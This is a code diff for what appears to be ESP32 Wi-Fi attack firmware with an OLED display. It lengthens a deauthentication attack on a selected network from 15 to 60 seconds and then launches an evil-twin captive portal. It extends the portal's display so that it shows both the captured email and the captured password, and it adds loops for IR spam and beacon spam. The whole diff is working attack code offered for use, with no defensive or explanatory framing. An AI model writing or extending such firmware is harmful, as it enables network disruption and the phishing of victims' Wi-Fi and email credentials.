@@ -26,7 +26,7 @@ bool handshake_menu = false;
 bool all_deauth_state = false;
 bool beacon_spam_state = false;
 
-String wifi;
+String wifi = "Test";
 short wifiScroll = 0;
 
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
@@ -58,6 +58,7 @@ void setup() {
 #ifdef LED
   pinMode(LED, OUTPUT);
 #endif
+
   WiFi.mode(WIFI_MODE_AP);
   WiFi.softAP(AP_SSID, AP_PASS);
 
@@ -71,9 +72,10 @@ void loop() {
     esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
     curr_channel++;
     delay(10);
-  } else
-  {
-    if (portalRunning) {
+  } 
+  else {
+    if (portalRunning)
+    {
       updateCaptivePortal();
     }
     else {
@@ -174,6 +176,19 @@ void wait_for_stop()
 {
   while (true)
   {
+    if (portalRunning)
+    {
+      updateCaptivePortal();
+    }
+    else {
+      web_interface_handle_client();
+    }
+
+    if (irSpam)
+    {
+      irSpamAllProtocols();
+    }
+
     if (beacon_spam_state)
     {
       BeaconSpam();
@@ -192,9 +207,16 @@ void wait_for_stop()
       if (portalRunning)
       {
         stopCaptivePortal();
+        delay(100);
+        
+        WiFi.mode(WIFI_MODE_AP);
+        WiFi.softAP(AP_SSID, AP_PASS);
+
+        start_web_interface();
         delay(200);
         return;
       }
+
       if (beacon_spam_state)
       {
         beacon_spam_state = false;
@@ -220,9 +242,17 @@ void wait_for_stop()
     if (isCaptured)
     {
       display.setCursor(0, 0);
-      display.println("Succeful");
-      display.println("Password: " + capturedPassword);
-      display.println("-> SELECT to stop");
+      display.println("Successful");
+      if (capturedEmail != "")
+      {
+        display.println("Email: " + capturedEmail);
+        display.println("Password: " + capturedPassword);
+      }
+      else
+      {
+        display.println("Password: " + capturedPassword);
+        display.println("-> SELECT to stop");
+      }
     }
     
     else 
@@ -281,7 +311,7 @@ void get_wifi()
         start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
         unsigned long deauthStart = millis();
 
-        while (millis() - deauthStart < 15000) {
+        while (millis() - deauthStart < 60000) {
             display.clearDisplay();
             display.setCursor(0, 20);
             display.println("Deauth running...");
@@ -289,8 +319,8 @@ void get_wifi()
             delay(100);
         }
         stop_deauth();
-
-        startCaptivePortal(&wifi);
+        
+        startCaptivePortal(&wifi, false);
         wait_for_stop();
 
         handshake_menu = false;
